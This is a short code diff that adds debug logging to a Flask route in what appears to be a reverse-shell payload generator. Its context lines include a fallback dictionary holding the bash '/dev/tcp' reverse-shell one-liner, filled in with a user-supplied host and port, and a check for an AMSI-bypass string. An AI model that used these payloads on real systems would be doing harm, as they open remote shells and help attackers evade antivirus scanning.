@@ -288,6 +288,10 @@ def payloads_generator():
         lport = request.form.get("lport", "4444")
         payload_type = request.form.get("payload_type", "bash")
         
+        # DEBUG
+        import sys
+        print(f"[PAYLOADS] Generating {payload_type} for {lhost}:{lport}", file=sys.stderr)
+        
         # Modern payloads via PayloadGenerator
         from cybermodules.payload_generator import PayloadGenerator
         
@@ -315,7 +319,9 @@ def payloads_generator():
         
         try:
             payload = generator.generate(payload_type, options)
+            print(f"[PAYLOADS] Generated {len(payload)} bytes, elite={('Invoke-AMSIBypass' in payload)}", file=sys.stderr)
         except Exception as e:
+            print(f"[PAYLOADS] Generation failed: {e}", file=sys.stderr)
             # Fallback to legacy reverse shells if needed
             payloads_dict = {
                 "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
@@ -329,6 +335,7 @@ def payloads_generator():
             }
             payload = payloads_dict.get(payload_type, payloads_dict["bash"])
             payload = payload.replace("LHOST", lhost).replace("LPORT", lport)
+            print(f"[PAYLOADS] Using fallback: {len(payload)} bytes", file=sys.stderr)
 
         with db_conn() as conn:
             conn.execute(
